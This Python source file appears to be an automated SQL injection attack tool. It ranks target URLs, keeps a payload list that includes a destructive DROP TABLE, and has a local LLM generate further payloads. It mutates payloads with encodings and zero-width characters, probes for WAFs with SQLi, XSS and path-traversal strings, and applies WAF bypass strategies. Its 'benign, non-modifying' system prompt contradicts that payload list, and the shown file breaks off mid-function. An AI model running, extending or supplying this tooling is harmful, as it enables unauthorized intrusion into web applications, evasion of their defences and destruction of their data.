import argparse, asyncio, json, os, re, sys, time, difflib, random, statistics, math, copy
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from typing import Dict, List, Set, Tuple, Optional, Any, Union
from collections import defaultdict, Counter, deque
from bs4 import BeautifulSoup
import numpy as np
try:
    from llama_cpp import Llama
except Exception:
    Llama=None
from playwright.async_api import async_playwright
import cloudscraper
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class DummyColor:
        def __getattr__(self, name): return ""
    Fore = DummyColor()
    Back = DummyColor()
    Style = DummyColor()

SQL_ERROR_RX=re.compile(r"(SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|PostgreSQL.*ERROR|SQL Server|ODBC.*SQL Server|SQLite.*(?:error|Exception)|UNION.*SELECT|ORA-\d{5}|psql:|PG::|SequelizeDatabaseError|ActiveRecord::StatementInvalid|PDOException|MySqlException|DataSourceError|org\.hibernate|JDBCException|System\.Data\.SqlClient|sqlite3\.OperationalError)",re.I)
DB_RX={"mysql":r"MySQL|mysql_|PDO.*MySQL|MySqlException","pgsql":r"PostgreSQL|PG::|org\.postgresql|psql:","mssql":r"SQL Server|ODBC.*SQL Server|System\.Data\.SqlClient|mssql|Microsoft OLE DB Provider for SQL Server","oracle":r"ORA-\d{5}|Oracle error|oci_","sqlite":r"SQLite|sqlite_error|sqlite3\.OperationalError"}
FRAME_RX=re.compile(r"(django|laravel|symfony|express|rails|spring|asp\.net|next\.js|nuxt|strapi|nestjs|adonis|koa|gin|fastapi|flask)",re.I)
JS_URL_RX=re.compile(r'(["\'])(https?://[^"\']+)\1|(?:fetch|axios\.(?:get|post)|open)\(\s*(["\'])(/[^"\']+)\3',re.I)
JSON_URL_RX=re.compile(r'["\']url["\']\s*:\s*["\'](/[^"\']+)["\']')

def sp():
    x=os.getenv("SYSTEM_PROMPT")
    if x: return x.strip()
    return "Benign, veri değiştirmeyen SQL injection test payloadları üret. Yalnızca JSON array döndür."

class IntelligentTargetSelector:
    def __init__(self):
        self.risk_weights = {
            'high_risk_params': ['id', 'user', 'admin', 'uid', 'pid', 'userid', 'account', 'username', 'email'],
            'medium_risk_params': ['search', 'query', 'filter', 'sort', 'order', 'page', 'limit', 'offset'],
            'high_risk_paths': ['/admin', '/api', '/user', '/profile', '/login', '/register', '/dashboard'],
            'medium_risk_paths': ['/search', '/filter', '/sort', '/view', '/edit', '/delete'],
            'sensitive_endpoints': ['/config', '/settings', '/database', '/backup', '/export']
        }
    
    def calculate_risk_score(self, url):
        pu = urlparse(url)
        score = 0
        params = list(parse_qs(pu.query).keys())
        for param in params:
            param_lower = param.lower()
            if param_lower in self.risk_weights['high_risk_params']:
                score += 8
            elif param_lower in self.risk_weights['medium_risk_params']:
                score += 3
            elif any(keyword in param_lower for keyword in ['id', 'key', 'token']):
                score += 2
        path_lower = pu.path.lower()
        for high_risk_path in self.risk_weights['high_risk_paths']:
            if high_risk_path in path_lower:
                score += 12
        for medium_risk_path in self.risk_weights['medium_risk_paths']:
            if medium_risk_path in path_lower:
                score += 5
        for sensitive_path in self.risk_weights['sensitive_endpoints']:
            if sensitive_path in path_lower:
                score += 15
        if re.search(r'/api/|/v\d+/|/graphql|/rest/', pu.path):
            score += 10
        if pu.query:
            query_complexity = len(parse_qs(pu.query))
            score += min(query_complexity, 5)
        return score
    
    def prioritize_targets(self, urls, max_targets=300):
        scored_urls = [(url, self.calculate_risk_score(url)) for url in urls]
        scored_urls.sort(key=lambda x: x[1], reverse=True)
        return [url for url, score in scored_urls[:max_targets]]
    
    def categorize_targets(self, urls):
        categories = {
            'high_risk': [],
            'medium_risk': [],
            'low_risk': [],
            'api_endpoints': [],
            'form_endpoints': []
        }
        for url in urls:
            score = self.calculate_risk_score(url)
            pu = urlparse(url)
            if score >= 20:
                categories['high_risk'].append(url)
            elif score >= 10:
                categories['medium_risk'].append(url)
            else:
                categories['low_risk'].append(url)
            if re.search(r'/api/|/v\d+/|/graphql', pu.path):
                categories['api_endpoints'].append(url)
            if parse_qs(pu.query):
                categories['form_endpoints'].append(url)
        return categories

class AdaptiveAIPayloadGenerator:
    def __init__(self, model_path=None, n_gpu_layers=16):
        self.llm = None
        self.payload_history = {}
        self.target_contexts = {}
        self.base_payloads = [
            "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--', "') OR ('1'='1", '") OR ("1"="1',
            "'; DROP TABLE users--", "admin'--", "' UNION SELECT NULL--", "1' ORDER BY 1--",
            "' AND 1=1--", '" AND 1=1--', "' OR 'a'='a", '" OR "a"="a', "' OR 1=1#", '" OR 1=1#',
            "admin' OR '1'='1", "'=(SELECT COUNT(*) FROM information_schema.tables)--",
            "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
            "' OR EXISTS(SELECT 1 FROM information_schema.tables)--"
        ]
        if model_path and Llama:
            try:
                self.llm = Llama(model_path=model_path, n_gpu_layers=n_gpu_layers, n_ctx=4096)
            except Exception as e:
                print(f"{Fore.RED}[ERROR] LLM başlatma hatası: {e}")

    def build_context_prompt(self, target_info, db_type, framework, previous_results=None):
        prompt = f"""
        Hedef: {target_info.get('url', 'unknown')}
        Veritabanı Türü: {db_type}
        Framework: {framework}
        Önceki Başarılı Payloadlar: {previous_results[:5] if previous_results else 'yok'}
        Parametreler: {target_info.get('params', [])}
        Yol: {target_info.get('path', '')}
        Yukarıdaki bağlama göre {target_info.get('param_count', 5)} adet etkili SQL injection payload üret.
        Payload'lar sadece hata tetiklemeli, veri değiştirmemeli.
        Her payload farklı teknik kullanmalı (time-based, error-based, boolean-based).
        JSON array formatında döndür.
        """
        return prompt

    def generate_contextual_payloads(self, target_info, db_type, framework, previous_results=None, n=30):
        payloads = self.base_payloads.copy()
        if self.llm:
            try:
                prompt = self.build_context_prompt(target_info, db_type, framework, previous_results)
                response = self.llm.create_chat_completion(
                    messages=[{"role": "system", "content": sp()}, {"role": "user", "content": prompt}],
                    max_tokens=1200, temperature=0.7
                )
                content = response["choices"][0]["message"]["content"].strip()
                ai_payloads = self.parse_ai_response(content)
                if ai_payloads: payloads.extend(ai_payloads)
            except Exception as e:
                print(f"{Fore.YELLOW}[WARN] AI payload üretme hatası: {e}")
        polymorphic_payloads = self.generate_polymorphic_variations(payloads[:15])
        payloads.extend(polymorphic_payloads)
        db_specific_payloads = self.generate_db_specific_payloads(db_type)
        payloads.extend(db_specific_payloads)
        unique_payloads = list(dict.fromkeys(payloads))
        return unique_payloads[:n]

    def parse_ai_response(self, content):
        try:
            if content.startswith('[') and content.endswith(']'):
                return json.loads(content)
            else:
                lines = [line.strip().strip('"\'') for line in content.split('\n') if line.strip()]
                return [line for line in lines if len(line) > 3 and len(line) < 150]
        except: return []

    def generate_polymorphic_variations(self, payloads):
        variations = []
        for payload in payloads:
            variations.append(payload.replace("'", "%27").replace('"', "%22"))
            variations.append(payload.replace("'", "%2527").replace('"', "%2522"))
            variations.append(payload.replace("'", "&#39;").replace('"', "&#34;"))
            variations.append(payload.replace(" ", "/**/"))
            if "OR" in payload: variations.append(payload.replace("OR", "oR").replace("or", "Or"))
            if "AND" in payload: variations.append(payload.replace("AND", "aNd").replace("and", "AnD"))
            variations.append(payload.replace(" ", "+"))
            variations.append(payload.replace(" ", "%20"))
        return variations

    def generate_db_specific_payloads(self, db_type):
        db_payloads = {
            'mysql': ["' OR (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM mysql.user)>0--", "' OR SLEEP(5)--", "'; SELECT SLEEP(5)--", "' OR BENCHMARK(1000000,MD5(1))--"],
            'pgsql': ["' OR (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM pg_tables)>0--", "' OR pg_sleep(5)--", "'; SELECT pg_sleep(5)--", "' OR EXISTS(SELECT 1 FROM pg_sleep(5))--"],
            'mssql': ["' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--", "' AND (SELECT COUNT(*) FROM sysobjects)>0--", "' OR WAITFOR DELAY '00:00:05'--", "'; WAITFOR DELAY '00:00:05'--", "' OR 1=(SELECT COUNT(*) FROM master.dbo.sysdatabases)--"],
            'oracle': ["' OR (SELECT COUNT(*) FROM all_tables)>0--", "' AND (SELECT COUNT(*) FROM dual)>0--", "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "'; BEGIN DBMS_LOCK.SLEEP(5); END;--", "' OR EXISTS(SELECT 1 FROM dual WHERE 1=1)--"]
        }
        return db_payloads.get(db_type.lower(), [])

class LearningDetectionEngine:
    def __init__(self):
        self.pattern_database = {}
        self.false_positive_cache = set()
        self.vulnerability_signatures = {}
        self.confidence_threshold = 0.8
        self.feature_weights = {
            'content_diff': 1.3, 'tag_diff': 0.9, 'sql_error': 1.6, 'header_change': 1.0, 'status_diff': 1.2,
            'timing_anomaly': 0.8, 'size_anomaly': 0.6
        }

    def calculate_basic_score(self, baseline, test_result):
        html1 = baseline.get("html", "")
        html2 = test_result.get("html", "")
        content_diff = 1.0 - difflib.SequenceMatcher(None, html1, html2).ratio()
        tags1 = self.tag_profile(html1)
        tags2 = self.tag_profile(html2)
        tag_diff = self.profile_dist(tags1, tags2)
        sql_error = bool(SQL_ERROR_RX.search(html2))
        header_change = 0
        for k in ["content-encoding", "transfer-encoding", "content-length"]:
            if test_result.get("headers", {}).get(k, "") != baseline.get("headers", {}).get(k, ""):
                header_change += 0.2
        status_diff = 1.0 if test_result.get("status", 200) != baseline.get("status", 200) else 0
        score = (self.feature_weights['content_diff'] * content_diff) + (self.feature_weights['tag_diff'] * tag_diff) + (self.feature_weights['sql_error'] * (1.6 if sql_error else 0)) + (self.feature_weights['header_change'] * header_change) + (self.feature_weights['status_diff'] * status_diff)
        return score

    def tag_profile(self, html):
        soup = BeautifulSoup(html, "html.parser")
        d = {}
        for el in soup.find_all(True):
            t = el.name
            d[t] = d.get(t, 0) + 1
        total = sum(d.values()) or 1
        for k in d: d[k] = d[k] / total
        return d

    def profile_dist(self, a, b):
        keys = set(a.keys()) | set(b.keys())
        return sum(abs(a.get(k, 0) - b.get(k, 0)) for k in keys)

    def contextual_analysis(self, baseline, test_result, payload):
        score = 0
        baseline_time = baseline.get("response_time", 0)
        test_time = test_result.get("response_time", 0)
        if baseline_time > 0 and test_time > baseline_time * 3:
            score += self.feature_weights['timing_anomaly']
        baseline_size = len(baseline.get("html", ""))
        test_size = len(test_result.get("html", ""))
        if baseline_size > 0:
            size_ratio = test_size / baseline_size
            if size_ratio > 3 or size_ratio < 0.3:
                score += self.feature_weights['size_anomaly']
        test_html_lower = test_result.get("html", "").lower()
        error_keywords = ['error', 'exception', 'warning', 'fatal', 'stack trace']
        for keyword in error_keywords:
            if keyword in test_html_lower: score += 0.3
        return score

    def calculate_confidence(self, score):
        if score > 2.0: return 'very_high'
        elif score > 1.5: return 'high'
        elif score > 0.8: return 'medium'
        elif score > 0.3: return 'low'
        else: return 'very_low'

    async def intelligent_analysis(self, baseline, test_result, payload):
        basic_score = self.calculate_basic_score(baseline, test_result)
        contextual_score = self.contextual_analysis(baseline, test_result, payload)
        final_score = basic_score + contextual_score
        return {
            'score': final_score,
            'confidence': self.calculate_confidence(final_score),
            'sql_error': bool(SQL_ERROR_RX.search(test_result.get("html", ""))),
            'is_vulnerable': final_score > 0.8,
            'details': {'basic_score': basic_score, 'contextual_score': contextual_score}
        }

class DynamicFrameworkAdapter:
    def __init__(self):
        self.framework_signatures = {
            'django': {'headers': ['wsgi', 'django'], 'patterns': ['csrftoken', 'django', 'csrfmiddlewaretoken'], 'csrf_token': True, 'default_headers': {'X-CSRFToken': 'PLACEHOLDER'}},
            'laravel': {'headers': ['laravel_session'], 'patterns': ['XSRF-TOKEN', 'laravel', '_token'], 'csrf_token': True, 'default_headers': {'X-XSRF-TOKEN': 'PLACEHOLDER'}},
            'spring': {'headers': ['JSESSIONID'], 'patterns': ['spring', 'thymeleaf', '_csrf'], 'csrf_token': True, 'default_headers': {'X-CSRF-TOKEN': 'PLACEHOLDER'}},
            'express': {'headers': ['express'], 'patterns': ['csrf', 'express', '_csrf'], 'csrf_token': True, 'default_headers': {'CSRF-Token': 'PLACEHOLDER'}},
            'rails': {'headers': ['rails'], 'patterns': ['authenticity_token', 'rails'], 'csrf_token': True, 'default_headers': {'X-CSRF-Token': 'PLACEHOLDER'}}
        }

    async def detect_framework(self, html, headers):
        detected_frameworks = []
        header_string = " ".join([f"{k}:{v}" for k, v in headers.items()]).lower()
        for framework, signature in self.framework_signatures.items():
            if any(h.lower() in header_string for h in signature.get('headers', [])):
                detected_frameworks.append(framework)
        html_lower = html.lower()
        for framework, signature in self.framework_signatures.items():
            if any(p.lower() in html_lower for p in signature.get('patterns', [])):
                if framework not in detected_frameworks:
                    detected_frameworks.append(framework)
        return detected_frameworks

    def get_framework_adaptations(self, frameworks):
        adaptations = {'csrf_handling': [], 'header_modifications': {}, 'payload_modifications': [], 'form_handling': {}}
        for framework in frameworks:
            if framework in self.framework_signatures:
                signature = self.framework_signatures[framework]
                if signature.get('csrf_token'):
                    adaptations['csrf_handling'].append(framework)
                adaptations['header_modifications'].update(signature.get('default_headers', {}))
        return adaptations

class IntelligentEncoder:
    def __init__(self):
        self.encoding_strategies = [
            'url_encoding', 'double_url_encoding', 'unicode_encoding', 'html_entities',
            'comment_injection', 'whitespace_variants', 'case_variations'
        ]

    def generate_smart_encodings(self, payload):
        encodings = set([payload])
        encodings.add(payload.replace("'", "%27").replace('"', "%22"))
        encodings.add(payload.replace("'", "%2527").replace('"', "%2522"))
        encodings.add(payload.replace("'", "&#39;").replace('"', "&#34;"))
        encodings.add(payload.replace(" ", "/**/"))
        encodings.add(payload.replace("OR", "O/**/R").replace("or", "o/**/r"))
        encodings.add(payload.replace(" ", "\u00A0"))
        encodings.add(payload.replace(" ", "\u2003"))
        encodings.add(payload.replace(" ", "+"))
        encodings.add(payload.replace("'", "\u0027"))
        encodings.add(payload.replace('"', "\u0022"))
        if "OR" in payload: encodings.add(payload.replace("OR", "oR"))
        if "AND" in payload: encodings.add(payload.replace("AND", "aNd"))
        if "SELECT" in payload: encodings.add(payload.replace("SELECT", "SeLeCt"))
        zero_width_payloads = set()
        for p in encodings:
            zero_width_payloads.add(p)
            zero_width_payloads.add("\u200b".join(list(p)))
            zero_width_payloads.add("\u200c".join(list(p)))
        encodings.update(zero_width_payloads)
        try:
            hex_payload = ''.join([f'%{ord(c):02x}' for c in payload])
            encodings.add(hex_payload)
        except: pass
        return list(encodings)

class BehavioralProfiler:
    def __init__(self):
        self.baseline_profiles = {}
        self.anomaly_detectors = {}
        self.behavior_signatures = {}

    async def create_behavioral_baseline(self, target_url, sample_count=15):
        responses = []
        timing_samples = []
        for i in range(sample_count):
            try:
                test_url = self.generate_benign_variant(target_url, i)
                response = await http_fetch(test_url)
                responses.append(response)
                timing_samples.append(response.get('response_time', 0))
            except Exception: continue
        if not responses:
            try:
                response = await http_fetch(target_url)
                responses.append(response)
                timing_samples.append(response.get('response_time', 0))
            except Exception: pass
        profile = {
            'response_time_patterns': self.extract_timing_patterns(timing_samples),
            'content_structure': self.extract_content_structure(responses),
            'header_patterns': self.extract_header_patterns(responses),
            'error_patterns': self.extract_error_patterns(responses),
            'size_patterns': self.extract_size_patterns(responses)
        }
        self.baseline_profiles[target_url] = profile
        return profile

    def generate_benign_variant(self, url, index):
        pu = urlparse(url)
        if pu.query:
            qs = parse_qs(pu.query, keep_blank_values=True)
            new_qs = {}
            for k, v in qs.items():
                if v and len(v) > 0:
                    new_qs[k] = [f"{v[0]}_{index}" if v[0] else str(index)]
                else:
                    new_qs[k] = [str(index)]
            new_query = urlencode(new_qs, doseq=True, safe=":/@")
            return urlunparse(pu._replace(query=new_query))
        else:
            new_path = pu.path.rstrip('/') + f"/test_{index}"
            return urlunparse(pu._replace(path=new_path))

    def extract_timing_patterns(self, timing_samples):
        if not timing_samples:
            return {'mean': 0, 'std': 0, 'min': 0, 'max': 0}
        return {
            'mean': statistics.mean(timing_samples),
            'std': statistics.stdev(timing_samples) if len(timing_samples) > 1 else 0,
            'min': min(timing_samples),
            'max': max(timing_samples),
            'median': statistics.median(timing_samples)
        }

    def extract_content_structure(self, responses):
        if not responses:
            return {'avg_length': 0, 'tag_diversity': 0}
        lengths = [len(r.get('html', '')) for r in responses]
        tag_counts = []
        for response in responses:
            html = response.get('html', '')
            soup = BeautifulSoup(html, 'html.parser')
            tags = [tag.name for tag in soup.find_all()]
            tag_counts.append(len(set(tags)))
        return {
            'avg_length': statistics.mean(lengths) if lengths else 0,
            'std_length': statistics.stdev(lengths) if len(lengths) > 1 else 0,
            'avg_tag_diversity': statistics.mean(tag_counts) if tag_counts else 0
        }

    def extract_header_patterns(self, responses):
        if not responses:
            return {}
        header_keys = []
        for response in responses:
            headers = response.get('headers', {})
            header_keys.extend(list(headers.keys()))
        header_counter = Counter(header_keys)
        return dict(header_counter)

    def extract_error_patterns(self, responses):
        error_count = 0
        for response in responses:
            html = response.get('html', '')
            if SQL_ERROR_RX.search(html):
                error_count += 1
        return {'sql_error_rate': error_count / len(responses) if responses else 0}

    def extract_size_patterns(self, responses):
        sizes = [len(r.get('html', '')) for r in responses]
        return {
            'avg_size': statistics.mean(sizes) if sizes else 0,
            'std_size': statistics.stdev(sizes) if len(sizes) > 1 else 0,
            'min_size': min(sizes) if sizes else 0,
            'max_size': max(sizes) if sizes else 0
        }

    def detect_behavioral_anomalies(self, test_response, baseline_profile):
        anomalies = []
        if self.is_timing_anomalous(test_response, baseline_profile):
            anomalies.append('timing_anomaly')
        if self.is_content_structure_anomalous(test_response, baseline_profile):
            anomalies.append('content_anomaly')
        if self.is_header_anomalous(test_response, baseline_profile):
            anomalies.append('header_anomaly')
        return anomalies

    def is_timing_anomalous(self, test_response, baseline_profile):
        test_time = test_response.get('response_time', 0)
        timing_patterns = baseline_profile.get('response_time_patterns', {})
        mean_time = timing_patterns.get('mean', 0)
        std_time = timing_patterns.get('std', 0)
        if std_time > 0:
            z_score = abs(test_time - mean_time) / std_time
            return z_score > 3
        elif mean_time > 0:
            return test_time > mean_time * 5
        return False

    def is_content_structure_anomalous(self, test_response, baseline_profile):
        test_html = test_response.get('html', '')
        content_structure = baseline_profile.get('content_structure', {})
        test_length = len(test_html)
        avg_length = content_structure.get('avg_length', 0)
        std_length = content_structure.get('std_length', 0)
        if std_length > 0:
            z_score = abs(test_length - avg_length) / std_length
            return z_score > 3
        elif avg_length > 0:
            ratio = test_length / avg_length
            return ratio > 5 or ratio < 0.2
        return False

    def is_header_anomalous(self, test_response, baseline_profile):
        test_headers = set(test_response.get('headers', {}).keys())
        baseline_headers = set(baseline_profile.get('header_patterns', {}).keys())
        if baseline_headers:
            missing_headers = baseline_headers - test_headers
            new_headers = test_headers - baseline_headers
            header_change_ratio = (len(missing_headers) + len(new_headers)) / len(baseline_headers)
            return header_change_ratio > 0.5
        return False

class PolymorphicPayloadGenerator:
    def __init__(self):
        self.mutation_operators = {}
        self.payload_gene_pool = {}
        self.evolution_history = {}

    def generate_polymorphic_payloads(self, base_payloads, generations=3):
        evolved_payloads = set(base_payloads)
        for generation in range(generations):
            new_generation = set()
            for payload in evolved_payloads:
                mutated_payloads = self.apply_mutation_operators(payload)
                new_generation.update(mutated_payloads)
            if len(evolved_payloads) > 1:
                crossover_payloads = self.apply_crossover_operations(list(evolved_payloads))
                new_generation.update(crossover_payloads)
            evolved_payloads.update(new_generation)
        return list(evolved_payloads)[:100]

    def apply_mutation_operators(self, payload):
        mutations = []
        mutations.append(self.url_encode_payload(payload))
        mutations.append(self.html_entity_encode_payload(payload))
        mutations.append(self.unicode_encode_payload(payload))
        mutations.append(self.insert_comments(payload))
        mutations.append(self.change_whitespace(payload))
        mutations.append(self.case_variations(payload))
        logical_eq_results = self.logical_equivalence_mutations(payload)
        if isinstance(logical_eq_results, list):
            mutations.extend(logical_eq_results)
        else:
            mutations.append(logical_eq_results)
        flattened_mutations = []
        for item in mutations:
            if isinstance(item, list):
                flattened_mutations.extend(item)
            elif isinstance(item, str):
                flattened_mutations.append(item)
        return list(dict.fromkeys(flattened_mutations))

    def url_encode_payload(self, payload):
        return payload.replace("'", "%27").replace('"', "%22").replace(" ", "%20")

    def html_entity_encode_payload(self, payload):
        return payload.replace("'", "&#39;").replace('"', "&#34;").replace("<", "<").replace(">", ">")

    def unicode_encode_payload(self, payload):
        return payload.replace("'", "\u0027").replace('"', "\u0022")

    def insert_comments(self, payload):
        return payload.replace(" ", "/**/").replace("OR", "O/**/R").replace("AND", "A/**/ND")

    def change_whitespace(self, payload):
        return payload.replace(" ", "\u00A0")

    def case_variations(self, payload):
        result = payload
        if "OR" in payload: result = result.replace("OR", "oR")
        if "AND" in payload: result = result.replace("AND", "aNd")
        if "SELECT" in payload: result = result.replace("SELECT", "SeLeCt")
        return result

    def logical_equivalence_mutations(self, payload):
        mutations = []
        if "1=1" in payload:
            mutations.append(payload.replace("1=1", "2=2"))
            mutations.append(payload.replace("1=1", "TRUE"))
        if "'1'='1" in payload:
            mutations.append(payload.replace("'1'='1", "'2'='2"))
        return mutations

    def apply_crossover_operations(self, payloads):
        if len(payloads) < 2:
            return []
        crossover_results = []
        for i in range(min(10, len(payloads))):
            parent1 = random.choice(payloads)
            parent2 = random.choice(payloads)
            if parent1 != parent2:
                child = self.simple_crossover(parent1, parent2)
                crossover_results.append(child)
        return crossover_results

    def simple_crossover(self, parent1, parent2):
        split_point = min(len(parent1), len(parent2)) // 2
        child = parent1[:split_point] + parent2[split_point:]
        return child

class SecurityMechanismDetector:
    def __init__(self):
        self.waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', 'cf-cache-status'],
            'akamai': ['akamai', 'x-akamai', 'akamaized'],
            'modsecurity': ['mod_security', 'modsecurity'],
            'imperva': ['incap_ses', 'visid_incap'],
            'sucuri': ['sucuri', 'x-sucuri'],
            'f5_bigip': ['bigipserver', 'f5']
        }
        self.security_headers = [
            'x-frame-options', 'x-content-type-options', 'x-xss-protection',
            'content-security-policy', 'strict-transport-security'
        ]
        self.blocking_patterns = []

    async def detect_security_mechanisms(self, target_url):
        detection_results = {
            'waf_detected': False, 'waf_type': None, 'security_headers': {}, 'blocking_patterns': [], 'adaptive_strategies': {}
        }
        waf_info = await self.detect_waf(target_url)
        # Hata düzeltme: waf_info'nun her zaman doğru yapıya sahip olduğundan emin olun
        detection_results['waf_detected'] = waf_info.get('detected', False)
        detection_results['waf_type'] = waf_info.get('type', None)
        security_headers = await self.analyze_security_headers(target_url)
        detection_results['security_headers'] = security_headers
        return detection_results

    async def detect_waf(self, target_url):
        # Varsayılan değerlerle başlayalım
        waf_indicators = {'detected': False, 'type': None, 'confidence': 0.0}
        try:
            test_payloads = ["' OR 1=1--", "<script>alert(1)</script>", "../../../../etc/passwd", " UNION SELECT NULL--"]
            for payload in test_payloads:
                test_url = self.inject_payload_to_url(target_url, payload)
                response = await http_fetch(test_url)
                headers = response.get('headers', {})
                header_string = " ".join([f"{k}:{v}" for k, v in headers.items()]).lower()
                for waf_name, signatures in self.waf_signatures.items():
                    if any(sig.lower() in header_string for sig in signatures):
                        waf_indicators['detected'] = True
                        waf_indicators['type'] = waf_name
                        waf_indicators['confidence'] = 0.9
                        return waf_indicators
                html_content = response.get('html', '').lower()
                if 'blocked' in html_content or 'forbidden' in html_content or 'waf' in html_content:
                    waf_indicators['detected'] = True
                    waf_indicators['confidence'] = 0.7
        except Exception as e:
            print(f"{Fore.YELLOW}[WARN] WAF tespiti hatası: {e}")
        return waf_indicators # Her zaman bir dict döndür

    def inject_payload_to_url(self, url, payload):
        pu = urlparse(url)
        if pu.query:
            qs = parse_qs(pu.query, keep_blank_values=True)
            if qs:
                first_param = list(qs.keys())[0]
                qs[first_param] = [f"{qs[first_param][0] if qs[first_param] else ''}{payload}"]
                new_query = urlencode(qs, doseq=True, safe=":/@")
                return urlunparse(pu._replace(query=new_query))
        return url

    async def analyze_security_headers(self, target_url):
        try:
            response = await http_fetch(target_url)
            headers = response.get('headers', {})
            security_headers_found = {}
            for header in self.security_headers:
                if header in headers:
                    security_headers_found[header] = headers[header]
            return security_headers_found
        except Exception as e:
            print(f"{Fore.YELLOW}[WARN] Güvenlik header analizi hatası: {e}")
            return {}

    async def generate_waf_bypass_payloads(self, detected_waf, base_payloads):
        # Hata düzeltme: detected_waf'in doğru yapıya sahip olduğundan emin olun
        if not isinstance(detected_waf, dict) or not detected_waf.get('detected', False):
            return base_payloads
        waf_type = detected_waf.get('type')
        if not waf_type:
            return base_payloads
        bypass_strategies = self.get_waf_bypass_strategies(waf_type)
        bypass_payloads = []
        for payload in base_payloads:
            for strategy in bypass_strategies:
                bypass_payload = self.apply_bypass_strategy(payload, strategy)
                bypass_payloads.append(bypass_payload)
        return list(set(bypass_payloads + base_payloads))

    def get_waf_bypass_strategies(self, waf_type):
        strategies = {
            'modsecurity': ['comment_insertion', 'whitespace_variations', 'encoding_variations', 'function_obfuscation'],
            'cloudflare': ['user_agent_spoofing', 'header_manipulation', 'timing_variations'],
            'akamai': ['rate_limiting_bypass', 'cookie_manipulation']
        }
        return strategies.get(waf_type, ['encoding_variations'])

    def apply_bypass_strategy(self, payload, strategy):
        if strategy == 'comment_insertion':
            return payload.replace(" ", "/**/").replace("OR", "O/**/R")
        elif strategy == 'whitespace_variations':
            return payload.replace(" ", "\u00A0")
        elif strategy == 'encoding_variations':
            return payload.replace("'", "%27").replace('"', "%22")
        return payload

class DeepSemanticAnalyzer:
    def __init__(self):
        self.semantic_models = {}
        self.context_understanding = {}
        self.intent_recognition = {}
        self.entity_types = ['user', 'admin', 'data', 'table', 'column', 'database']

    async def deep_semantic_analysis(self, target_content, test_responses):
        semantic_features = self.extract_semantic_features(target_content)
        semantic_similarities = []
        for response in test_responses:
            similarity = self.calculate_semantic_similarity(
                semantic_features,
                self.extract_semantic_features(response.get('html', ''))
            )
            semantic_similarities.append(similarity)
        anomalies = self.detect_semantic_anomalies(semantic_similarities)
        return {
            'semantic_features': semantic_features,
            'similarities': semantic_similarities,
            'anomalies': anomalies
        }

    def extract_semantic_features(self, content):
        features = {
            'entity_types': self.extract_entities(content),
            'sentiment_analysis': self.analyze_sentiment(content),
            'key_phrases': self.extract_key_phrases(content),
            'intent_indicators': self.identify_intent_indicators(content)
        }
        return features

    def extract_entities(self, content):
        entities = []
        content_lower = content.lower()
        for entity in self.entity_types:
            if entity in content_lower:
                entities.append(entity)
        return list(set(entities))

    def analyze_sentiment(self, content):
        positive_words = ['success', 'welcome', 'logged', 'access', 'granted']
        negative_words = ['error', 'failed', 'denied', 'blocked', 'forbidden']
        content_lower = content.lower()
        positive_count = sum(1 for word in positive_words if word in content_lower)
        negative_count = sum(1 for word in negative_words if word in content_lower)
        if positive_count > negative_count:
            return 'positive'
        elif negative_count > positive_count:
            return 'negative'
        else:
            return 'neutral'

    def extract_key_phrases(self, content):
        key_phrases = [
            'database error', 'syntax error', 'invalid input', 'access denied',
            'login successful', 'welcome', 'admin panel', 'user data'
        ]
        found_phrases = []
        content_lower = content.lower()
        for phrase in key_phrases:
            if phrase in content_lower:
                found_phrases.append(phrase)
        return found_phrases

    def identify_intent_indicators(self, content):
        indicators = {
            'data_exposure': ['select', 'union', 'database', 'table', 'column'],
            'authentication_bypass': ['welcome', 'dashboard', 'admin', 'logged in'],
            'error_disclosure': ['error', 'exception', 'stack trace', 'debug']
        }
        found_indicators = {}
        content_lower = content.lower()
        for intent, keywords in indicators.items():
            count = sum(1 for keyword in keywords if keyword in content_lower)
            if count > 0:
                found_indicators[intent] = count
        return found_indicators

    def calculate_semantic_similarity(self, features1, features2):
        entities1 = set(features1.get('entity_types', []))
        entities2 = set(features2.get('entity_types', []))
        entity_similarity = len(entities1 & entities2) / max(len(entities1 | entities2), 1)
        phrases1 = set(features1.get('key_phrases', []))
        phrases2 = set(features2.get('key_phrases', []))
        phrase_similarity = len(phrases1 & phrases2) / max(len(phrases1 | phrases2), 1)
        return (entity_similarity * 0.6 + phrase_similarity * 0.4)

    def detect_semantic_anomalies(self, similarities):
        if not similarities:
            return []
        mean_similarity = statistics.mean(similarities)
        std_similarity = statistics.stdev(similarities) if len(similarities) > 1 else 0
        anomalies = []
        for i, similarity in enumerate(similarities):
            if std_similarity > 0:
                z_score = abs(similarity - mean_similarity) / std_similarity
                if z_score > 2:
                    anomalies.append(i)
            elif abs(similarity - mean_similarity) > 0.3:
                anomalies.append(i)
        return anomalies

class AdvancedTimingAnalyzer:
    def __init__(self):
        self.timing_thresholds = {}
        self.channel_analysis = {}
        self.side_channel_detectors = {}

    async def comprehensive_timing_analysis(self, target_url, test_payloads):
        timing_results = []
        baseline_timings = await self.create_timing_baseline(target_url, samples=15)
        for payload in test_payloads[:10]:
            payload_timings = await self.test_payload_timing(target_url, payload, samples=8)
            timing_analysis = self.analyze_timing_statistics(baseline_timings, payload_timings)
            timing_results.append({
                'payload': payload,
                'timing_analysis': timing_analysis,
                'side_channel_signals': await self.detect_side_channels(payload_timings)
            })
        return timing_results

    async def create_timing_baseline(self, target_url, samples=15):
        timings = []
        for i in range(samples):
            try:
                start_time = time.time()
                response = await http_fetch(target_url)
                end_time = time.time()
                timings.append(end_time - start_time)
            except Exception:
                timings.append(None)
        valid_timings = [t for t in timings if t is not None]
        if not valid_timings:
            return {'mean': 0, 'median': 0, 'std_dev': 0, 'percentiles': {}}
        return {
            'mean': statistics.mean(valid_timings),
            'median': statistics.median(valid_timings),
            'std_dev': statistics.stdev(valid_timings) if len(valid_timings) > 1 else 0,
            'percentiles': self.calculate_percentiles(valid_timings)
        }

    def calculate_percentiles(self, timings):
        if not timings:
